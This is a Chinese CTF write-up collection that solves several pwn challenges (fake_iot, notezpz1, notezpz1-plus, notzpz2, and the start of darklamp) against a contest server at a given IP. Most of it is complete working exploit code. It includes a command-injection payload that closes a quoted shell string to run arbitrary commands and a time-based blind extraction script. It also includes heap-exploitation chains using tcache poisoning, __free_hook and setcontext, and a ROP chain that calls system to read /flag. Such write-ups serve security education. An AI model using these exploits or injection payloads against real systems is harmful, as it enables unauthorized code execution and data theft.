    libc.address = leak(io, elf.got["fgets"]) - libc.sym["fgets"]
    log.info(f"libc base = {hex(libc.address)}")

    overlap_write_ptr(io, elf.got["atoi"])
    set_question(io, 1, p64(libc.sym["system"]) + b"\n")

    choose(io, b"A")
    io.sendlineafter(b"Enter question id: ", b"sh", timeout=3)
    io.sendline(b"cat /flag")
    print(io.recvrepeat(2).decode(errors="ignore"))


def main():
    io = start()
    exploit(io)
    io.close()


if __name__ == "__main__":
    main()
```

![Image](./images/img-040.png)

## 题目名称：fake_iot

解题人：cinco

解题过程

### **目录结构**

webpwn题 题目目录内容很简单：

- `bin/httpd`

- `busybox`

- `www/`

其中：

- `www/` 是前端页面

- `bin/httpd` 是服务端核心逻辑

- `busybox` 暗示后端运行环境是很轻量的 shell / 工具集

### **一、前端分析**

#### **1. 登录逻辑**

登录页在：

- `www/login.html`

- `www/auth.js`

前端登录逻辑非常显眼：

```js
if (password.value === "admin") {
  const issued = NetGateAuth.issueToken(username.value.trim() || "admin");
  ...
  window.location.href = `admin.html?token=${encodeURIComponent(issued.token)}`;
}
```

也就是说，本地附件前端的“登录”只是：

1. 检查密码是否等于 `admin`

2. 然后在浏览器本地 `localStorage` 里签发 token

#### **2. token 机制**

`www/auth.js` 里有完整 token 逻辑：

```js
const TOKEN_TTL_MS = 10 * 60 * 1000;
```

也就是：

- token 有效期 10 分钟

- 存储在 `localStorage`

- 通过 URL 参数 `?token=...` 或本地缓存取用

前端本地生成 token 的方式是：

1. `crypto.getRandomValues` 生成 32 字节随机数

2. base64-url 编码

这只能说明本地前端的设计，不代表远程后端真的接受这种 token。

#### **3. 管理接口**

`www/admin.js` 里调用了两个接口：

- `POST /api/lan`

- `POST /api/wifi`

提交时会把 token 一起放进表单：

```js
const body = new URLSearchParams({
  ...data,
  token,
});
```

所以攻击面很自然落到：

- token 校验

- `/api/lan`

- `/api/wifi`

### **二、后端静态分析**

#### **1. 关键字符串**

对 `bin/httpd` 做字符串提取后，能看到非常重要的信息：

```text
/api/lan
missing token
invalid or expired token
/api/login
bad credentials
mkdir -p runtime && echo '%s' > runtime/firewall.rule
runtime/lan.conf
runtime/wifi.conf
```

这几点非常关键：

1. 远程后端实际存在 `/api/login`

2. token 错误时会报 `invalid or expired token`

3. `/api/lan` 中 `firewallRule` 会进入一条 `system()` 命令

#### **2.\`/api/lan\` 的危险点**

反汇编 `handle_client` 可以还原出 `/api/lan` 的核心逻辑：

1. 从 POST body 中取：

    - `token`

    - `lanIp`

    - `subnetMask`

    - `dhcpEnabled`

    - `dhcpStart`

    - `dhcpEnd`

    - `gateway`

    - `dns`

    - `firewallRule`

2. 前面的配置会写入 `runtime/lan.conf`

3. `firewallRule` 最终进入：

```c
sprintf(buf, "mkdir -p runtime && echo '%s' > runtime/firewall.rule", firewallRule);
system(buf);
```

这个点非常明显：

- `firewallRule` 被放进单引号包裹的 shell 命令

- 没有任何 shell 转义

- 所以只要传入单引号 `'`，就可以闭合字符串并注入任意命令

这是标准命令注入。

#### **3. 本地与远程的差异**

本地附件里的 `httpd` 对 token 的处理很弱，静态看上去只要求长度大于 `0xf`。

但远程实际不是这样。

远程直接测试：

```text
POST /api/lan
token=x
```

返回：

```json
{"ok":false,"message":"invalid or expired token"}
```

说明：

- 远程服务比本地附件多了一层真正的 token 签发与校验

- 不能直接拿本地前端生成的 token 打远程

因此必须先找远程签 token 的后端接口。

### **三、远程差异探测**

#### **1. 探测隐藏接口**

对一批常见路径做探测后，发现：

```text
POST /api/login -> 401 {"ok":false,"message":"bad credentials"}
```

这说明远程确实存在隐藏登录接口 `/api/login`。

#### **2.\`/api/login\` 的参数测试**

进一步用不同参数组合测试，得到：

```text
{} -> 401 bad credentials
{'username': 'admin'} -> 401 bad credentials
{'password': 'admin'} -> 200 返回 token
{'username': 'admin', 'password': 'admin'} -> 200 返回 token
```

也就是说，这个登录接口校验极弱：

- 只要 `password=admin`

- 就会直接返回有效 token

典型成功响应如下：

```json
{
  "ok": true,
  "token": "a791369b7866a1c60aced5e2c58adef98d51b1c311494485f552f4ab566940d4",
  "issuedAt": 1780733569000,
  "expiresAt": 1780734169000,
  "ttlMs": 600000
}
```

到这里利用链已经完整：

1. `POST /api/login` 拿 token

2. 在 10 分钟有效期内打 `POST /api/lan`

3. 通过 `firewallRule` 命令注入拿 flag

### **四、直接回显为什么没有成功**

理论上命令注入后，最自然的做法是：

1. 把 `/flag` 复制到 Web 根目录

2. 再通过 HTTP GET 访问回来

例如尝试过：

```bash
cp /flag www/flag.json
```

或者向已知静态文件追加标记：

```bash
echo PWNMARK >> www/login.html
```

但远程没有命中

选择了更稳但更慢的方法：时间盲注。

### **五、时间盲注思路**

#### **1. 先确认命令注入真的成立**

使用：

```bash
sleep 3
```

测得请求延迟约 3 秒，证明命令注入在远程真实可用。

#### **2. 先确认\`/flag\` 可读**

例如：

```bash
[ -r /flag ] && sleep 1
cat /flag >/dev/null && sleep 1
```

都能稳定产生延迟，说明：

- `/flag` 可读

- 注入 shell 可以访问目标 flag 文件

#### **3. 选择稳定的字节读取方式**

一开始尝试过：

- `cut`

- `head`

- shell 命令替换直接比较

- `grep ^flag{ /flag`

最后稳定下来的方案是：

```bash
v=$(od -An -tx1 -j OFFSET -N1 /flag | tr -d " \n")
[ "$v" = "xx" ] && sleep 1
```

### **六、盲注恢复过程**

#### **1. 开头字节恢复**

按字节 hex 方式逐位确认：

```text
0 -> 48 -> H
1 -> 4e -> N
2 -> 43 -> C
3 -> 54 -> T
4 -> 46 -> F
5 -> 7b -> {
```

得到：

```text
HNCTF{
```

#### **2. 中间主体恢复**

继续对后续位置在字符集：

```text
0123456789abcdef-}
```

中逐位测试，最终恢复出：

```text
HNCTF{7d8f429f-91b5-4a5c-a5b6-787acebf9618}
```

### exp：

```python
#!/usr/bin/env python3
import requests
import string
import statistics
import time

HOST = "http://114.66.24.210:20904"
LOGIN_API = f"{HOST}/api/login"
LAN_API = f"{HOST}/api/lan"

# 题目环境里 flag 前缀和后续字符集
PREFIX = "HNCTF{"
CHARSET = "0123456789abcdef-}"
SLEEP_SECS = 1.0
TIMEOUT = 8

BASE_FORM = {
    "lanIp": "1",
    "subnetMask": "1",
    "dhcpEnabled": "1",
    "dhcpStart": "1",
    "dhcpEnd": "1",
    "gateway": "1",
    "dns": "1",
}

def login(session: requests.Session) -> str:
    r = session.post(LOGIN_API, data={"password": "admin"}, timeout=TIMEOUT)
    r.raise_for_status()
    data = r.json()
    if not data.get("ok") or "token" not in data:
        raise RuntimeError(f"login failed: {data}")
    return data["token"]

def inject(session: requests.Session, token: str, command: str):
    """
    关键注入点：
      mkdir -p runtime && echo '%s' > runtime/firewall.rule
    因此用 x'; COMMAND; #' 闭合单引号并注释掉尾巴。
    """
    form = dict(BASE_FORM)
    form["token"] = token
    form["firewallRule"] = f"x'; {command}; #'"
    t1 = time.perf_counter()
    r = session.post(LAN_API, data=form, timeout=TIMEOUT)
    dt = time.perf_counter() - t1
    return r, dt

def timed_condition(session: requests.Session, token: str, shell_cond: str, trials: int = 3, sleep_secs: float = SLEEP_SECS) -> float:
    """
    让远程在条件为真时 sleep，用请求耗时判断真假。
    返回多次请求的平均耗时。
    """
    cmd = f"{shell_cond} && sleep {sleep_secs}"
    samples = []
    for _ in range(trials):
        _, dt = inject(session, token, cmd)
        samples.append(dt)
    return statistics.mean(samples)

def check_injection(session: requests.Session, token: str):
    _, normal = inject(session, token, "true")
    _, delayed = inject(session, token, "sleep 2")
    print(f"[+] normal  request: {normal:.3f}s")
    print(f"[+] delayed request: {delayed:.3f}s")
    if delayed - normal < 1.2:
        raise RuntimeError("time-based injection does not look stable")

def check_flag_readable(session: requests.Session, token: str):
    avg = timed_condition(session, token, "[ -r /flag ]", trials=2, sleep_secs=1)
    print(f"[+] readable check avg: {avg:.3f}s")
    if avg < 0.8:
        raise RuntimeError("/flag may not be readable")

def guess_prefix(session: requests.Session, token: str, length: int = 6):
    print("[*] guessing prefix bytes ...")
    out = ""
    alphabet = string.printable.replace("\r", "").replace("\n", "")
    for i in range(length):
        best = None
        best_t = -1.0
        for ch in alphabet:
            hx = f"{ord(ch):02x}"
            cond = f'v=$(od -An -tx1 -j {i} -N1 /flag | tr -d " \\n"); [ "$v" = "{hx}" ]'
            avg = timed_condition(session, token, cond, trials=2)
            if avg > best_t:
                best_t = avg
                best = ch
        out += best
        print(f"[+] prefix[{i}] = {best!r}   avg={best_t:.3f}s   current={out}")
    return out

def extract_flag(session: requests.Session, token: str, prefix: str = PREFIX, max_len: int = 80):
    print(f"[*] starting extraction with prefix: {prefix}")
    known = prefix

    for i in range(len(prefix), max_len):
        best_ch = None
        best_t = -1.0
        best_all = []

        for ch in CHARSET:
            hx = f"{ord(ch):02x}"
            cond = f'v=$(od -An -tx1 -j {i} -N1 /flag | tr -d " \\n"); [ "$v" = "{hx}" ]'
            avg = timed_condition(session, token, cond, trials=3)
            best_all.append((avg, ch))
            if avg > best_t:
                best_t = avg
                best_ch = ch

        best_all.sort(reverse=True)
        print(f"[+] pos {i}: top candidates = {best_all[:3]}")


        if best_t < 0.75:
            print("[!] timing gap too small, you may need more trials or bigger sleep")
            break

        known += best_ch
        print(f"[+] flag so far: {known}")

        if best_ch == "}":
            return known

    return known

def verify_char(session: requests.Session, token: str, index: int, ch: str, trials: int = 5):
    hx = f"{ord(ch):02x}"
    cond = f'v=$(od -An -tx1 -j {index} -N1 /flag | tr -d " \\n"); [ "$v" = "{hx}" ]'
    avg = timed_condition(session, token, cond, trials=trials)
    print(f"[+] verify index={index} char={ch!r} avg={avg:.3f}s")
    return avg

def main():
    session = requests.Session()
    token = login(session)
    print(f"[+] token = {token}")

    check_injection(session, token)
    check_flag_readable(session, token)

    flag = extract_flag(session, token, prefix=PREFIX)
    print(f"[+] final candidate: {flag}")



if __name__ == "__main__":
    main()
```

![Image](./images/img-041.png)

## 题目名称：notezpz1

解题人：J4toPos

解题过程

### **保护**

本地 `checksec` 如下：

![Image](./images/img-042.png)

程序开了 Full RELRO、Canary、NX、PIE，典型思路是先想办法泄露地址，再走堆上函数指针或 libc hook。

### **程序逻辑**

从 IDA / gdb 可以很快还原出题目的核心结构：

```c
typedef struct question {
    void (*ask)(struct question *q);   // offset 0
    char pad[0x14];                    // offset 4 ~ 0x17
    char *text;                        // offset 0x18
} question;
```

几个关键函数：

1. `create_question`

    - `malloc(0x1c)` 分配 `question` 结构体

    - `malloc(0x14)` 分配 `text`

    - `q->ask = print_question`

2. `print_question`

    - 打印固定前缀

    - `printf("I have the answer perhaps: '%s'\n", q->text);`

3. `ask_question`

    - 直接调用 `q->ask(q)`

4. `delete_question`

    - `free(q->text);`

    - `free(q);`

5. `set_question`

    - 这是漏洞点：

```c
fgets(q->text, 0x50, stdin);
```

但 `q->text` 实际只分配了 `0x14` 字节，所以这里是一个非常直接的堆溢出。

### **漏洞分析**

#### **1. 堆溢出**

`text` 只分配了 `0x14`，却用 `fgets(..., 0x50, ...)` 读入，导致最多可以向后覆盖 `0x50 - 0x14 = 0x3c` 字节以上的数据。

连续创建两个问题后，实测两个 `question` 结构体指针差值为 `0x40`，说明：

- `q0->text` 后面可以覆盖到 `q1` 的结构体

- 因此可以改掉：

    - `q1->ask`

    - `q1->text`

这就非常舒服了，因为：

- 改 `q1->ask` 可以控制 `ask_question()` 的函数调用目标

- 改 `q1->text` 可以把 `print_question()` 变成任意地址泄露器

#### **2. 可控调用**

`ask_question` 的逻辑本质上是：

```c
q = get_question();
q->ask(q);
```

也就是说，只要我们把相邻的 `q1->ask` 改成任意函数地址，就能在后续 `ask 1` 的时候调用那个函数。

### **利用思路**

整体链路分 4 步：

1. 用堆溢出覆盖 `q1->ask` 和 `q1->text`

2. 先泄露堆地址和 GOT 地址

3. 通过 `puts@got` 识别远端 libc 并算出 `system` 和 `__free_hook`

4. 把 `__free_hook` 改成 `system`，再触发 `free(q2->text)` 执行命令读 flag

### **关键泄露**

#### **第一步：把\`print\_question\` 变成任意地址读**

先创建两个对象：`q0`、`q1`。

然后通过 `set_question(0, payload)` 溢出 `q0->text`，覆盖 `q1`：

- `q1->ask = print_question`

- `q1->text = &questions`

之后执行 `ask 1`，程序会走：

```c
print_question(q1);
printf("%s", q1->text);
```

此时 `q1->text` 被改成了全局数组 `questions` 的地址，相当于把 `questions[0]`、`questions[1]` 这两个堆指针当作字符串打印出来。虽然这不是一个“标准字符串”，但前几个字节足够我们直接拿到两个堆地址。

实战里这一步用来确认：

- 当前连接是否猜中了 PIE

- `q0` 和 `q1` 是否真的是相邻布局

命中后会看到：

```text
q0 = 0x57545160
q1 = 0x575451a0
q1 - q0 = 0x40
```

### **第二步：泄露\`puts@got\`**

确认命中后，再次溢出：

- `q1->ask = print_question`

- `q1->text = puts@got`

然后 `ask 1`，即可把 `puts` 的真实 libc 地址读出来。

### **PIE 处理**

因为程序开了 PIE，而且远端每次连接都会重新起进程，所以二进制基址会变。

- 预设一批可能的 PIE 页基址

- 多线程并发连接远端

- 每个线程随机选一个候选基址去打第一步泄露

- 一旦 `q1 - q0 == 0x40`，就认为当前连接猜中了 PIE

### **libc 识别**

泄露出 `puts` 后，观察到低 12 位是 `0xd90`，匹配 Ubuntu 18.04 i386 的：

```text
libc6_2.27-3ubuntu1.5_i386
libc6_2.27-3ubuntu1.6_i386
```

这两个版本关键偏移一致：

```text
puts        = 0x67d90
system      = 0x3d3d0
__free_hook = 0x1d98d0
```

因此：

```c
libc_base   = puts_addr - 0x67d90;
system      = libc_base + 0x3d3d0;
__free_hook = libc_base + 0x1d98d0;
```

### **最终利用**

再创建一个新对象 `q2`，把它的 `text` 设成要执行的命令：

```bash
cat flag* /flag* /home/*/flag* /app/*flag* 2>/dev/null
```

然后继续利用 `q0` 溢出改 `q1`：

- `q1->ask = print_question`

- `q1->text = __free_hook`

此时执行 `set_question(1, p32(system))`，就会把 `system` 地址写进 `__free_hook`。

最后调用：

```c
delete_question(2);
```

`delete_question` 会先执行：

```c
free(q2->text);
```

由于 `__free_hook = system`，这一步实际变成：

```c
system(q2->text);
```

于是命令被执行，flag 直接回显。

![Image](./images/img-043.png)

## 题目名称：notezpz1-plus

解题人：J4toPos

解题过程

### **保护**

`checksec`：

![Image](./images/img-044.png)

这版和上一题最大的差别不在菜单逻辑，而在 64 位、PIE、Full RELRO 以及 CET 标记都开了，所以直接写 GOT / 直接函数指针跳 `system` 都不够顺手，必须把泄露链和调用链都搭完整。

### **程序逻辑**

从调试符号和反汇编可以直接还原出关键结构：

```c
struct question {
    void (*ask)(struct question *q);  // offset 0x00
    char pad[0x18];                   // offset 0x08 ~ 0x1f
    char *text;                       // offset 0x20
};
```

关键函数：

1. `create_question`

    - `malloc(0x28)` 分配结构体

    - `malloc(0x28)` 分配 `text`

    - `q->ask = print_question`

2. `print_question`

```c
puts("Dobby has a question for you");
printf("I have the answer perhaps: '%s'\n", q->text);
```

3. `delete_question`

```c
free(q->text);
free(q);
```

但是没有把全局数组里的指针清空。

4. `set_question`

```c
fgets(q->text, 0x78, stdin);
```

`text` 实际只分配了 `0x28`，这里是稳定的堆溢出。

5. `ask_question`

```c
q->ask(q);
```

### **漏洞点**



这题其实是三个点叠在一起：

#### **1. 堆溢出**

`malloc(0x28)` 配 `fgets(..., 0x78)`，可以从当前 `text` 一路覆盖到后面的 chunk。

#### **2. UAF / dangling pointer**

`delete_question` 释放后不清 `questions[id]`，旧 id 还能继续拿到悬挂对象。

#### **3. 同尺寸 chunk**

结构体 chunk 和 `text` chunk 都是同一尺寸类，所以 tcache 里它们可以互相顶替。这一点是后面把“活着的 struct 当字符串打印”和“伪造 setcontext frame”的基础。

### **第一步：heap 泄露**

先创建 7 个对象，记为 `0..6`。

然后：

1. `delete(1)`

2. `delete(0)`

3. `create()` 得到新对象 `7`

此时 `7` 的 `text` 来自旧的 `B0`。这个 chunk 在 tcache 里时残留了 safe-linking 的 `next`，所以直接 `ask(7)` 就能看到一串脏数据：

```text
I have the answer perhaps: '\x99H\xfb\xf4\x91U'
```

把它按 little-endian 补成 8 字节，再结合当前链上两个 chunk 的固定相对距离，就能反推出：

- `B0`

- `A0`

- `A1`

这里的关键不是“把脏字符串完整读出来”，而是只要前 6 个字节够用，就能把 safe-linking 的方程解出来。

### **第二步：tcache poisoning 泄露 PIE**

现在我们已经知道：

- `A0`：旧 `question 0` 结构体

- `A1`：旧 `question 1` 结构体

先让 dangling 的 `id=1` 去写 `B1`，提前埋一些之后 `setcontext` 要用的字段。同时把 `q2->content` 还原成正确的 `B2`，否则后面 `set_question(2)` 会直接炸掉。

接着用 `id=7` 从 `B0` 覆盖 `A1->next = A0 ^ (A1 >> 12)`。

再 `create()` 一次，新的 `id=8` 会变成：

- `struct = A1`

- `content = A0`

而 `A0` 本身是一块活着的结构体，开头就是合法的 `print_question` 地址。于是：

```text
ask(8)
```

打印出来的前几个字节就是 `print_question` 的真实地址，直接减去符号偏移就得到 PIE base。

### **第三步：libc 泄露**

有了 PIE 之后，还是用 `id=7` 覆盖 `id=8` 的前半个结构体：

- `q8->ask = print_question`

- `q8->text = 某个可打印的 libc 指针`

这里直接使用 `puts@got` 作为泄露点，避免字符串打印在低字节为 `0x00` 时提前截断。  

这台机器上实测可以稳定泄到：

```text
puts       -> 0x7f4b19148be0
libc_base  -> 0x7f4b190c1000
system     -> 0x7f4b19119750
setcontext -> 0x7f4b1910b960
```

再用 `puts` 向下扫 ELF 头，确认了远端 libc base 对应的 `puts` offset 是：

```text
puts = 0x87be0
```

把这些偏移扔到 `libc.rip` 检索，命中了 Ubuntu 24.04 的 glibc 2.39 分支（`libc6_2.39-0ubuntu8.{4,5,6}_amd64` 这几版的关键偏移一致）：

```text
puts       = 0x87be0
system     = 0x58750
setcontext = 0x4a960
```

于是最后用：

```c
libc_base = puts_addr - 0x87be0;
system = libc_base + 0x58750;
setcontext = libc_base + 0x4a960;
```

### **第四步：构造 setcontext frame**

这题最烦的点就是 `system(q)` 不行，因为 `ask_question` 传给函数指针的参数是 `q` 本身，不是 `q->text`。

所以必须借 `setcontext` 改寄存器，把：

- `RDI = command_string`

- `RSP = fake_stack`

- `RIP = system`

### **具体落点**

以 `q = A1` 为 fake frame 基址：

- `q + 0x68`：命令字符串指针

- `q + 0xa0`：fake `rsp`

- `q + 0xa8`：`system`

- `q + 0xe0`：`fpstate`

- `q + 0x1c0`：`mxcsr`

分别由不同 chunk 写入：

1. `id=1 -> B1`

    - 提前写 `q + 0x68 = B0`

2. `id=2 -> B2`

    - 写 `q + 0xa0 = q + 0x248`

    - 写 `q + 0xa8 = system`

    - 写 `q + 0xe0 = q + 0x180`

3. `id=4 -> B4`

    - 把 `q + 0x180 ~ q + 0x1bf` 清零，给 `fldenv` 用

    - 写 `q + 0x1c0 = 0x1f80`

4. `id=7 -> B0`

    - `B0` 开头放命令字符串，比如 `cat flag\x00`

    - `q->ask = setcontext`

### **最终触发**

所有字段写好之后，直接：

```text
ask(8)
```

把命令设成：

```text
cat flag
```

### exp:

```python
#!/usr/bin/env python3
from pwn import ELF, context, p64, remote, u64

HOST = "114.66.24.210"
PORT = 23294
BINARY = "./notezpz"
CMD = b"cat flag"

REMOTE_OFFSETS = {
    "puts": 0x87BE0,
    "system": 0x58750,
    "setcontext": 0x4A960,
}


def recv_menu_resync(io):
    data = io.recvuntil(b"choice, (or press enter to refresh): ", timeout=2)
    extra = io.recvrepeat(0.05)
    while b"choice, (or press enter to refresh): " in extra:
        data = extra[extra.rfind(b"choice, (or press enter to refresh): ") :]
        extra = io.recvrepeat(0.05)
    return data + extra


def choice(io, c):
    recv_menu_resync(io)
    io.sendline(c)


def create(io):
    choice(io, b"C")


def delete(io, idx):
    choice(io, b"D")
    io.recvuntil(b"Enter question id: ", timeout=2)
    io.sendline(str(idx).encode())


def set_question(io, idx, data):
    if len(data) > 0x77:
        raise ValueError(f"payload too long: {len(data):#x}")
    choice(io, b"S")
    io.recvuntil(b"Enter question id: ", timeout=2)
    io.sendline(str(idx).encode())
    io.recvuntil(b"Enter your question: ", timeout=2)
    io.send(data + b"\n")


def ask_leak(io, idx):
    choice(io, b"A")
    io.recvuntil(b"Enter question id: ", timeout=2)
    io.sendline(str(idx).encode())
    out = io.recvuntil(b"'\n", timeout=2)
    io.recvrepeat(0.05)
    return out.split(b"perhaps: '")[1].split(b"'\n")[0]


def solve_rel(enc, delta):
    x = enc
    for _ in range(20):
        x = (enc ^ (x >> 12)) - delta
    return x & ((1 << 64) - 1)


def exploit(io, elf, cmd):
    for _ in range(7):
        create(io)

    delete(io, 1)
    delete(io, 0)
    create(io)  # id7 -> A0 / B0

    enc = u64(ask_leak(io, 7).ljust(8, b"\x00"))
    b0 = solve_rel(enc, 0x30)
    a0 = b0 - 0x30
    a1 = b0 + 0x30
    b1 = a1 + 0x30
    b2 = a0 + 0xF0

    q = a1
    q_rsp = q + 0x248
    fpstate = q + 0x180

    # id1 is still a dangling handle to A1/B1. Use it to preset future
    # setcontext fields while restoring q2->content to B2.
    buf1 = bytearray(b"1" * 0x77)
    buf1[0x50:0x58] = p64(b2)  # keep q2->content valid
    buf1[(q + 0x68) - b1 : (q + 0x68) - b1 + 8] = p64(b0)
    set_question(io, 1, bytes(buf1))

    # Poison A1->next = A0 so the next create gives id8: struct=A1, content=A0.
    set_question(io, 7, b"A" * 0x30 + p64(a0 ^ (a1 >> 12)))
    create(io)

    pie = u64(ask_leak(io, 8).ljust(8, b"\x00")) - elf.sym["print_question"]

    leak_target = pie + elf.got["puts"]
    leak_payload = (
        b"A" * 0x30
        + p64(pie + elf.sym["print_question"])
        + b"B" * 0x18
        + p64(leak_target)
    )
    set_question(io, 7, leak_payload)

    leak_addr = u64(ask_leak(io, 8).ljust(8, b"\x00"))
    libc_base = leak_addr - REMOTE_OFFSETS["puts"]
    system = libc_base + REMOTE_OFFSETS["system"]
    setcontext = libc_base + REMOTE_OFFSETS["setcontext"]

    buf2 = bytearray(b"2" * 0x77)
    buf2[(q + 0xA0) - b2 : (q + 0xA0) - b2 + 8] = p64(q_rsp)
    buf2[(q + 0xA8) - b2 : (q + 0xA8) - b2 + 8] = p64(system)
    buf2[(q + 0xE0) - b2 : (q + 0xE0) - b2 + 8] = p64(fpstate)
    set_question(io, 2, bytes(buf2))

    b4 = a0 + 0x1B0
    off_fp = fpstate - b4
    off_mx = (q + 0x1C0) - b4
    buf4 = bytearray(b"4" * 0x77)
    for i in range(off_fp, off_mx):
        buf4[i] = 0
    buf4[off_mx : off_mx + 7] = p64(0x1F80)[:7]
    set_question(io, 4, bytes(buf4))

    off_q = q - b0
    buf0 = bytearray(b"P" * 0x38)
    buf0[: len(cmd) + 1] = cmd + b"\x00"
    buf0[off_q : off_q + 8] = p64(setcontext)
    set_question(io, 7, bytes(buf0))

    choice(io, b"A")
    io.recvuntil(b"Enter question id: ", timeout=2)
    io.sendline(b"8")
    return io.recvrepeat(2)


def main():
    elf = ELF(BINARY)
    io = remote(HOST, PORT)
    try:
        out = exploit(io, elf, CMD)
        print(out.decode("latin1", errors="replace"))
    finally:
        io.close()


if __name__ == "__main__":
    main()
```

![Image](./images/img-045.png)

## 题目名称：notzpz2

解题人：J4toPos

解题过程

### **题目分析**

用 IDA 看二进制，关键逻辑很直接：

- `create_question()`：申请一个 `0x520` 的 `question` 结构体，再申请一个 `0x410` 的文本块，`text` 指针在结构体偏移 `0x18`。

- `delete_question()`：`free(q->text); free(q);`，但是不会把 `questions[id]` 清空。

- `set_question()`：`fgets(q->text, 120, stdin)`。

- `ask_question()`：调用 `print_question(q)`，本质是 `printf("I have the answer perhaps: '%s'", q->text)`。

因此核心漏洞是：

1. `delete` 后全局数组里还留着悬空指针，存在 UAF。

2. `ask` 能把 `q->text` 指向的位置当成字符串打印出来。

3. `set` 能把数据写到 `q->text` 指向的位置。

### **堆利用思路**

先布置出两个 stale handle：

1. 连续 `create` 6 次，得到 `id 0~5`。

2. `delete(1)`, `delete(3)`, `create()`，让旧的 `id 1` 变成一个可写的 largebin header handle。

3. `delete(0)`, `delete(3)`, `create()`，让旧的 `id 0` 也变成另一个可写/可读的 stale handle。

之后利用两个悬空句柄分工：

- `id 3`：读取 unsorted bin 指针，泄露 libc。

- `id 0`：把它的 `text` 指向 `environ`，继续泄露栈地址。

- `id 1`：把它的 `text` 改到栈上保存返回地址的位置，然后直接覆写返回地址为 ROP。

### **泄露与劫持**

#### **1. 泄露 libc**

利用 `ask(3)` 读出 unsorted bin 指针，得到：

- `main_arena+offset`

- 该实例对应的 `libc_base = leak - 0x203b20`

#### **2. 泄露栈地址**

这一实例的 libc 环境与本地验证一致，`environ` 偏移为：

- `environ = libc_base + 0x20ad58`

先用 `set_question(0, b"A"*0x28 + p64(environ))` 改写 stale 结构里的 `text` 指针，再 `ask(0)` 读取 `environ` 保存的栈地址。

#### **3. 改写返回地址**

从栈泄露可以定位到 `menu/main` 的保存返回地址，这里使用：

- `stack_ret = environ_value - 0x130`

然后把第二个 stale handle 的 `text` 改到 `stack_ret`，直接写入 ROP：

1. `ret`

2. `pop rdi ; ret`

3. 指向栈上命令字符串 `"cat /flag; exit"`

4. `system`

5. `exit`

最后菜单输入 `Q`，函数返回时执行 ROP，直接打印 flag。

### exp：

```python
import socket
import struct
import time


HOST = "114.66.24.210"
PORT = 22162

UNSORTED_OFF = 0x203B20
ENVIRON_OFF = 0x20AD58
SYSTEM_OFF = 0x58750
EXIT_OFF = 0x47BA0
POP_RDI_OFF = 0x10F78B
RET_OFF = 0x2882F

CMD = b"cat /flag; exit\x00"


def p64(x):
    return struct.pack("<Q", x)


class IO:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=3)
        self.s.settimeout(0.3)
        self.buf = b""

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass

    def send(self, data):
        self.s.sendall(data)

    def recv_until(self, marker, timeout=3.0):
        end = time.time() + timeout
        while marker not in self.buf:
            if time.time() > end:
                raise TimeoutError(f"timeout waiting for {marker!r}, tail={self.buf[-120:]!r}")
            try:
                data = self.s.recv(4096)
                if not data:
                    raise EOFError(self.buf)
                self.buf += data
            except socket.timeout:
                continue
        idx = self.buf.index(marker) + len(marker)
        out = self.buf[:idx]
        self.buf = self.buf[idx:]
        return out

    def recv_all(self, timeout=1.5):
        end = time.time() + timeout
        out = b""
        while time.time() < end:
            try:
                data = self.s.recv(4096)
                if not data:
                    break
                out += data
                end = time.time() + 0.3
            except socket.timeout:
                continue
        return out


def menu(io, choice):
    io.recv_until(b"Enter your choice, (or press enter to refresh): ")
    io.send(choice + b"\n")


def create(io):
    menu(io, b"C")


def delete(io, idx):
    menu(io, b"D")
    io.recv_until(b"Enter question id: ")
    io.send(str(idx).encode() + b"\n")


def set_question(io, idx, data):
    menu(io, b"S")
    io.recv_until(b"Enter question id: ")
    io.send(str(idx).encode() + b"\n")
    io.recv_until(b"Enter your question: ")
    io.send(data)


def ask(io, idx):
    menu(io, b"A")
    io.recv_until(b"Enter question id: ")
    io.send(str(idx).encode() + b"\n")
    out = io.recv_until(b"[C]reate", timeout=3.0)
    prefix = b"I have the answer perhaps: '"
    if prefix not in out:
        raise ValueError(out)
    data = out[out.index(prefix) + len(prefix):-len(b"[C]reate")]
    if data.endswith(b"'\n"):
        data = data[:-2]
    return data


def exploit(host=HOST, port=PORT, attempts=30):
    for attempt in range(1, attempts + 1):
        io = IO(host, port)
        try:
            for _ in range(6):
                create(io)

            delete(io, 1)
            delete(io, 3)
            create(io)
            delete(io, 0)
            delete(io, 3)
            create(io)

            libc_leak = int.from_bytes(ask(io, 3)[:8].ljust(8, b"\x00"), "little")
            libc_base = libc_leak - UNSORTED_OFF
            env_sym = libc_base + ENVIRON_OFF

            if b"\n" in p64(env_sym):
                continue

            set_question(io, 0, b"A" * 0x28 + p64(env_sym) + b"\n")
            env = int.from_bytes(ask(io, 0)[:8].ljust(8, b"\x00"), "little")

            stack_ret = env - 0x130
            system = libc_base + SYSTEM_OFF
            exit_ = libc_base + EXIT_OFF
            pop_rdi = libc_base + POP_RDI_OFF
            ret = libc_base + RET_OFF
            cmd_addr = stack_ret + 0x40

            targets = [stack_ret, system, exit_, pop_rdi, ret, cmd_addr]
            if any(b"\n" in p64(x) for x in targets):
                continue

            pivot = b"B" * 0x28 + p64(stack_ret) + b"\n"
            if b"\n" in pivot[:-1]:
                continue

            rop = p64(ret) + p64(pop_rdi) + p64(cmd_addr) + p64(system) + p64(exit_)
            rop = rop.ljust(0x40, b"X") + CMD
            if b"\n" in rop:
                continue

            set_question(io, 1, pivot)
            set_question(io, 1, rop + b"\n")

            menu(io, b"Q")
            out = io.recv_all(2.0)
            if b"flag{" in out.lower():
                return out.decode("latin1", errors="replace")
        finally:
            io.close()
    raise RuntimeError("exploit failed after retries")


if __name__ == "__main__":
    print(exploit())
```

![Image](./images/img-046.png)

## 题目名称：darklamp

解题人：weixiao

解题过程

### **1. 题目保护**

程序是 64 位 `PIE`，并开启了：

- `Full RELRO`

- `Canary`

- `NX`

- `seccomp`

。`seccomp` 虽然限制了系统调用，但 `openat/open`、`read`、`write` 这类 ORW 所需调用仍然可用，所以最终方向就是想办法把控制流劫持到 libc，然后做 ORW 读 `/flag`。

### **2. 核心漏洞**

最关键的函数是 `light()`：

```c
void light()
{
    size_t sz;
    size_t n;
    unsigned char *p;

    printf("oil: ");
    sz = read_ulong();
    if ( sz > 0x1f && sz <= 0x500 )
    {
        p = malloc(sz);
        ...
        if ( !g_lens )
        {
            g_lens = malloc(0x30);
            g_lens->magic  = 0x1111111111111111;
            g_lens->seal   = 0x2222222222222222;
            g_lens->focus  = g_ash;
            g_lens->cursor = 0;
            g_lens->budget = 0x20;
            g_lens->mood   = 0;
        }
        printf("flame: ");
        n = read_ulong();
        if ( n > 0x800 ) exit(0);
